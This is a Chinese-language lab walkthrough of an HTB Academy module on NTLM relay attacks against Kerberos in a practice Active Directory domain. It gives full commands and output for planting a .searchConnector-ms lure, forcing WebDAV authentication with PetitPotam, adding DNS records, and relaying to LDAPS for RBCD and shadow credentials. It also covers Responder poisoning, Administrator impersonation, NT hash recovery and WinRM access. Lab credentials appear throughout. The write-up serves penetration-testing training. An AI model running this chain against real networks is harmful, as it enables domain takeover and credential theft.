# Advanced NTLM Relay Attacks Targeting Kerberos

**Module**：HTB Academy — *NTLM Relay Attacks* → Advanced NTLM Relay Attacks Targeting Kerberos

**環境**

| 角色 | 主機 | IP |
|---|---|---|
| 攻擊跳板（Linux） | ACADEMY-NTLMR01-LINUX01 | SSH `10.129.45.81`，內網 `ens192 = 172.16.117.30` |
| DC + ADCS CA | DC01 | `172.16.117.3` |
| 受害機（WebDAV victim） | SQL01 | `172.16.117.60` |
| 工作站 | WS01 | `172.16.117.50` |

**網域**：`inlanefreight.local`
**低權限網域帳號**：`inlanefreight\rons`，NT hash `914b011029e6b43cf188d435951831bd`（pass-the-hash）

> 工具都在跳板的 `~/tools/`（impacket、PetitPotam、krbrelayx、PKINITtools、Responder、Certipy…）。
> 本文所有指令都在跳板 `htb-student@10.129.45.81` 上執行；需要 root（綁 80/445）的用 `sudo`。

---

## 前置：建立可重用的 SSH 連線 + sudo

密碼登入每次都要互動，於是用 SSH ControlMaster 共用一條連線：

```bash
ssh -o ControlMaster=yes -o ControlPath=~/.htbcm.sock -o ControlPersist=600 \
    htb-student@10.129.45.81    # 密碼 HTB_@cademy_stdnt!
# 之後所有指令：
ssh -o ControlPath=~/.htbcm.sock htb-student@10.129.45.81 '<cmd>'
```

**除錯重點 1 — 背景服務會被 SSH session 砍掉**
一開始用 `setsid nohup ntlmrelayx.py ... &` 起 relay，log 明明印了 `Servers started`，但下一條指令去看 `ss -ltnp` 就發現 process 不見了、`curl` 回 `000`。SSH session 關閉時 SIGHUP 把它帶走了（`setsid` 也救不回來）。

**解法**：所有長駐服務一律丟進 root 的 `tmux` session，跟 SSH 生命週期脫鉤：

```bash
sudo tmux new-session -d -s relay "ntlmrelayx.py ... | tee /tmp/relay.log"
sudo tmux capture-pane -pt relay -S -40   # 讀即時輸出
```

**除錯重點 2 — `tee` 會把 log buffer 住**
用 `... | tee /tmp/relay.log` 時，`cat /tmp/relay.log` 常常是舊的（block buffering）。改成 `stdbuf -oL -eL ntlmrelayx.py ... > /tmp/relay.log 2>&1`（行緩衝），再 `chmod 666` log 檔，就能用非 root 穩定 tail。

---

## Q1：用 `.searchConnector-ms` 強制 `\\DC01\Testing` 的瀏覽者啟用 WebDAV

**原理**：`.searchConnector-ms` 內的 `simpleLocation/url` 指到攻擊機的 HTTP/WebDAV；當有主機（透過排程）去開 `\\DC01\Testing` 這個資料夾時，Windows 的 Explorer/索引器會去連那個 URL，進而**啟動該主機的 WebClient 服務**（= WebDAV 被啟用）。WebDAV 的 HTTP 認證沒有 SMB 的簽章保護，後面才能拿去 relay 到 LDAP。

### 1. 確認可寫入 Testing 分享

```bash
printf 'shares\nuse Testing\nls\n' | \
  smbclient.py -hashes :914b011029e6b43cf188d435951831bd \
  inlanefreight.local/rons@dc01.inlanefreight.local
```

`rons` 可讀寫 `Testing`（順便看到還有 `CertEnroll` 分享 → 有 ADCS，供後面 AD CS 小節用）。

### 2. 放誘餌檔

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<iconReference>http://172.16.117.30/windows/0001.ico</iconReference>
<templateInfo>
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
</templateInfo>
<simpleLocation>
<url>http://172.16.117.30/windows</url>
</simpleLocation>
</searchConnectorDescription>
```

> **坑**：`folderType` GUID 必須正好是 `{91475FE5-586B-4EBA-8D75-D17434B8CDF6}`。GUID 打錯 Windows 會直接當無效檔忽略，守再久都沒連線。別憑印象拼，直接抄 CrackMapExec 的 `drop-sc` 模組 payload。

```bash
cd /tmp && printf 'use Testing\nput testing.searchConnector-ms\nls\n' | \
  smbclient.py -hashes :914b011029e6b43cf188d435951831bd \
  inlanefreight.local/rons@dc01.inlanefreight.local
```

> impacket `smbclient.py` 的 `put` 只吃單一本機路徑、用 basename 上傳，不能 `put a b`。

### 3. 起 HTTP listener，抓誰連進來

```python
# /tmp/log80.py — 記錄來源 IP 與 User-Agent，PROPFIND/OPTIONS 都收
import http.server,datetime
class H(http.server.BaseHTTPRequestHandler):
    def _l(s):
        print(datetime.datetime.now().strftime("%H:%M:%S"),s.client_address[0],
              s.command,s.path,"UA="+s.headers.get("User-Agent",""),flush=True)
        s.send_response(200);s.send_header("Content-Length","0");s.end_headers()
    do_GET=do_HEAD=do_OPTIONS=do_PROPFIND=_l
    def log_message(s,*a):pass
http.server.HTTPServer(("0.0.0.0",80),H).serve_forever()
```

```bash
sudo tmux new-session -d -s nl "python3 /tmp/log80.py > /tmp/l80.out 2>&1"
```

> 起之前發現 `:80` 被上一輪殘留的 `ntlmrelayx.py` 佔著，先 `sudo pkill -f ntlmrelayx.py`。

等約 2–3 分鐘：

```
12:34:26 172.16.117.60 OPTIONS  /windows UA=Microsoft-WebDAV-MiniRedir/10.0.17763
12:34:26 172.16.117.60 PROPFIND /windows UA=Microsoft-WebDAV-MiniRedir/10.0.17763
```

來源 `172.16.117.60`、UA 是 `Microsoft-WebDAV-MiniRedir` → **SQL01 的 WebClient 已啟動（WebDAV 已啟用）**。

### ✅ Q1 Answer：`172.16.117.60`

---

## Q2：把 SQL01 的 HTTP NTLM relay 到 LDAP，用 RBCD 拿下 SQL01

**攻擊鏈**：coerce SQL01 → 它用機器帳號 `SQL01$` 對我們做 WebDAV(HTTP) 認證 → `ntlmrelayx` relay 到 DC 的 LDAPS → `--delegate-access` 幫我們新建一台電腦帳號並在 `SQL01$` 上設定 RBCD → `getST` 用該電腦帳號 S4U 冒充 Administrator 拿 `cifs/sql01` 票 → 讀 flag。

### 1. 確認 MachineAccountQuota

```bash
python3 -c 'from impacket.ldap import ldap
l=ldap.LDAPConnection("ldap://172.16.117.3","DC=inlanefreight,DC=local","172.16.117.3")
l.login("rons","","inlanefreight.local","","914b011029e6b43cf188d435951831bd")
print(l.search(searchFilter="(objectClass=domain)",attributes=["ms-DS-MachineAccountQuota"]))'
# ms-DS-MachineAccountQuota = 10  →  ntlmrelayx 可自動建電腦帳號
```

### 2. 起 relay（LDAPS + --delegate-access）

```bash
sudo tmux new-session -d -s relay \
 "stdbuf -oL -eL ntlmrelayx.py -t ldaps://172.16.117.3 -smb2support \
   --delegate-access --no-dump > /tmp/relay.log 2>&1"
```

### 3. coerce SQL01 走 WebDAV —— **這裡卡最久**

第一次直接把 PetitPotam 的 listener 設成 IP：

```bash
python3 ~/tools/PetitPotam/PetitPotam.py -d inlanefreight.local -u rons \
  -hashes :914b011029e6b43cf188d435951831bd 172.16.117.30@80/test 172.16.117.60
# [+] Attack worked!   ← 但 relay 完全沒反應
```

用 tcpdump 側錄才看懂：

```bash
sudo tcpdump -ni ens192 'src host 172.16.117.60 and dst port 80'
# 172.16.117.60.50386 > 172.16.117.30.80: PROPFIND /test/PIPE/srvsvc
```

SQL01 **確實連進 :80 了**，`ntlmrelayx` 也回了 401，但 SQL01 **始終不送 NTLM**。

**根因**：WebClient 只會對「內部網路區域（Intranet Zone）」的主機自動送 NTLM 認證。目標是**裸 IP**時被判為 Internet Zone → 不送認證。要用一個**單標籤主機名**（single-label，無點）讓它被判為 Intranet。

**修法**：在 AD-integrated DNS 加一筆 A record 指向攻擊機。`krbrelayx` 的 `dnstool.py` 不支援 `-hashes`，所以先用 hash 換一張 TGT，再用 `-k`：

```bash
# 1) PtH 換 TGT
getTGT.py inlanefreight.local/rons -hashes :914b011029e6b43cf188d435951831bd -dc-ip 172.16.117.3

# 2) 加 DNS 記錄 attacker -> 172.16.117.30
cd ~/tools/krbrelayx
KRB5CCNAME=/tmp/rons.ccache python3 dnstool.py -k -u 'inlanefreight.local\rons' \
  -dc-ip 172.16.117.3 -dns-ip 172.16.117.3 \
  -r attacker -a add -t A -d 172.16.117.30 dc01.inlanefreight.local
# [+] LDAP operation completed successfully
```

> `dnstool.py` 會先去解析 zone 的 SOA，用系統 resolver（`127.0.0.53`）會 SERVFAIL，必須加 `-dns-ip 172.16.117.3` 把 DNS 指向 DC。記錄進 LDAP 後約 180 秒才會被 DNS 服務載入：
> ```bash
> nslookup attacker.inlanefreight.local 172.16.117.3   # 等到回 172.16.117.30
> ```

用**單標籤名** coerce（SQL01 會補上自己的 DNS 後綴解析，且因無點被判 Intranet → 送 NTLM）：

```bash
python3 ~/tools/PetitPotam/PetitPotam.py -d inlanefreight.local -u rons \
  -hashes :914b011029e6b43cf188d435951831bd attacker@80/test 172.16.117.60
```

relay log：

```
[*] HTTPD(80): Authenticating against ldaps://172.16.117.3 as INLANEFREIGHT/SQL01$ SUCCEED
[*] Adding new computer with username: CKVANVID$ and password: Rt^5yFWm*!OWHxJ result: OK
[*] Delegation rights modified succesfully!
[*] CKVANVID$ can now impersonate users on SQL01$ via S4U2Proxy
```

### 4. S4U 冒充 Administrator，讀 flag

```bash
cd /tmp
getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator \
  -dc-ip 172.16.117.3 'inlanefreight.local/CKVANVID$:Rt^5yFWm*!OWHxJ'
# -> Administrator.ccache

KRB5CCNAME=/tmp/Administrator.ccache smbclient.py -k -no-pass sql01.inlanefreight.local <<'EOF'
use C$
cd Users\Administrator\Desktop
get flag.txt
EOF
```

### ✅ Q2 Answer：`RBCD_Using_NTLMRelay`

---

## Q3：把 CJAQ 的 HTTP NTLM relay 到 LDAP，對 JPEREZ 做 Shadow Credentials

**攻擊鏈**：relay 網域使用者 `CJAQ`（對 `jperez` 有寫入權）→ LDAP → `ntlmrelayx --shadow-credentials` 在 `jperez` 的 `msDS-KeyCredentialLink` 塞一張憑證 → PKINIT 拿 `jperez` 的 TGT → `getnthash` 取 NT hash → `jperez` 屬 *Remote Management Users* → evil-winrm 連 DC 讀 flag。

### 1. 先看 jperez / cjaq

```bash
# jperez memberOf -> CN=Remote Management Users  (→ 可 WinRM 進 DC)
# 用 impacket LDAP 查 sAMAccountName=jperez / cjaq 的 DN、memberOf
```

### 2. 起 shadow-credentials relay

```bash
sudo tmux new-session -d -s relay \
 "stdbuf -oL -eL ntlmrelayx.py -t ldaps://172.16.117.3 -smb2support \
   --shadow-credentials --shadow-target jperez > /tmp/relay.log 2>&1"
```

並把 Testing 的誘餌改成單標籤名（讓瀏覽者走認證版 WebDAV）：`http://attacker/windows`。

### 3. 關鍵排錯 —— 為什麼一直抓不到 CJAQ

連 relay 的永遠只有 SQL01（`172.16.117.60`），而且身分是一個**本機帳號誘餌** `SQL01/SQL01LOCALUSERNAME`：

```
[*] Authenticating against ldaps://172.16.117.3 as SQL01/SQL01LOCALUSERNAME SUCCEED
    IndexError: list index out of range        # 非網域使用者，privilege 查詢爆掉
[*] ...Connection from 172.16.117.60 controlled, but there are no more targets left!
```

**兩個致命點：**

1. **單一 target 被第一個認證吃掉**。`ntlmrelayx` 用單一 `-t` 時，第一個成功 relay（就算後續 attack 失敗）就把 target 移除，之後所有連線都 `no more targets left`。誘餌搶在前面，CJAQ 永遠排不到。
2. **擋掉 .60 後 14 分鐘零連線** → 代表 CJAQ 根本不是從 .60 來。

**曾經走的彎路**：
- 寫 watchdog「一偵測到 `no more targets left` 就重啟 relay 重置 dedup」→ 快速重啟造成 :80 間歇性 refused，把受害機的 **WebDAV negative cache** 搞髒，結果 14 分鐘完全沒主機來連。放棄。

**找出真相 — 被動 NTLM 盤點（不消耗 target）**：
自己手刻一個會回 Type2 challenge 的 HTTP server 來記錄所有 WebDAV 認證的使用者名；但用 impacket 組 `NTLMAuthChallenge` 時 `NTLMSSP_NEGOTIATE_VERSION` flag 需要 Version 欄位，噴 `Trying to pack None`，不值得繼續手刻。改用 **Responder 純被動擷取**：

```bash
cd ~/tools/Responder && python3 Responder.py -I ens192 -v
```

Responder 的紀錄揭露真相：

```
[HTTP] NTLMv2 Client   : fe80::6d4c:ab8c:8e47:177b      # IPv6 link-local，另一台主機
[HTTP] NTLMv2 Username : INLANEFREIGHT\cjaq
[HTTP] NTLMv2 Username : INLANEFREIGHT\nports
```

→ **CJAQ 來自另一台主機（IPv6），而且它只透過 LLMNR/mDNS 的「名稱投毒」才會連到我們**。它解析不到單播 DNS 的 `attacker`，退回多播查詢；純 `ntlmrelayx`（只綁 IPv4、靠 DNS）因此永遠看不到 CJAQ，只有能正常 DNS 解析的 SQL01 會連進來。

### 4. 正確組合：Responder（只投毒）+ ntlmrelayx（relay，多 target + IPv6）

把 Responder 的 HTTP/SMB server 關掉（讓出 80/445），只留投毒器；`ntlmrelayx` 用 `-6` 同時聽 IPv4/IPv6，並用 `-tf` 給多個「拼法不同但都指向 DC01」的 LDAPS target，讓它能連續 relay 不同使用者（誘餌、peter、nports 各吃一個 slot，CJAQ 來時仍有 slot）：

```bash
# Responder.conf: SMB = Off, HTTP = Off  （保留 LLMNR/NBT-NS/mDNS 投毒）
cat > /tmp/targets.txt <<'EOF'
ldaps://172.16.117.3
ldaps://dc01
ldaps://DC01
ldaps://dc01.inlanefreight.local
ldaps://DC01.INLANEFREIGHT.LOCAL
ldaps://inlanefreight.local
ldaps://INLANEFREIGHT.LOCAL
ldaps://dc01.INLANEFREIGHT.local
EOF

sudo tmux new-session -d -s relay \
 "stdbuf -oL -eL ntlmrelayx.py -tf /tmp/targets.txt -6 -smb2support \
   --shadow-credentials --shadow-target jperez > /tmp/relay.log 2>&1"
sudo tmux new-session -d -s resp \
 "cd ~/tools/Responder && stdbuf -oL -eL python3 Responder.py -I ens192 -v > /tmp/resp.out 2>&1"
```

不到 1 分鐘：

```
[*] HTTPD(80): Authenticating against ldaps://DC01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/CJAQ SUCCEED
[*] Saved PFX (#PKCS12) certificate & key at path: t5F7iHsQ.pfx
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx t5F7iHsQ.pfx \
      -pfx-pass uz0L5HfNggH7zSbwg7ro INLANEFREIGHT.LOCAL/jperez t5F7iHsQ.ccache
```

### 5. PKINIT → NT hash → WinRM 進 DC

```bash
cd /tmp
# 1) 用 shadow 憑證換 jperez 的 TGT
python3 ~/tools/PKINITtools/gettgtpkinit.py -cert-pfx /tmp/t5F7iHsQ.pfx \
  -pfx-pass uz0L5HfNggH7zSbwg7ro INLANEFREIGHT.LOCAL/jperez /tmp/jperez.ccache
#   AS-REP encryption key: 40740a28470aa76bf13227d8d59ea2a628dca5761d9f1c598cd05a95ccf2ca1d

# 2) 取 jperez NT hash
KRB5CCNAME=/tmp/jperez.ccache python3 ~/tools/PKINITtools/getnthash.py \
  -key 40740a28470aa76bf13227d8d59ea2a628dca5761d9f1c598cd05a95ccf2ca1d \
  INLANEFREIGHT.LOCAL/jperez
#   Recovered NT Hash: c9d393c8a0b2dfcf72eba102df5ceee6

# 3) jperez 屬 Remote Management Users → WinRM 進 DC01 讀自己的桌面
printf 'type C:\\Users\\jperez\\Desktop\\flag.txt\nexit\n' | \
  evil-winrm -i 172.16.117.3 -u jperez -H c9d393c8a0b2dfcf72eba102df5ceee6
```

### ✅ Q3 Answer：`Shadow_Cr3dent1als_4ttcks`

---

## 總結（本小節踩過的坑）

| 現象 | 根因 | 解法 |
|---|---|---|
| 背景 relay 起了就死 | SSH session 關閉 SIGHUP | 丟 root `tmux` |
| log 不更新 | `tee` block buffering | `stdbuf -oL` + `> file` |
| coerce「成功」但 relay 沒反應 | 裸 IP 被判 Internet Zone，WebClient 不送 NTLM | 加單標籤 DNS A record，用 `attacker@80` coerce |
| `dnstool.py` 不吃 `-hashes` / SOA SERVFAIL | 工具限制 / resolver 不對 | `getTGT` 換 TGT 後 `-k`、加 `-dns-ip 172.16.117.3` |
| 永遠只抓到 SQL01 誘餌 | 單 target 被先到者吃掉；CJAQ 走多播投毒、IPv6 | Responder 只投毒 + `ntlmrelayx -6 -tf` 多 target |

## 清理

```bash
sudo tmux kill-server; sudo pkill -f 'ntlmrelayx.py|Responder.py'
# 還原 Responder.conf；DNS 記錄可用 dnstool -a remove 清掉
```
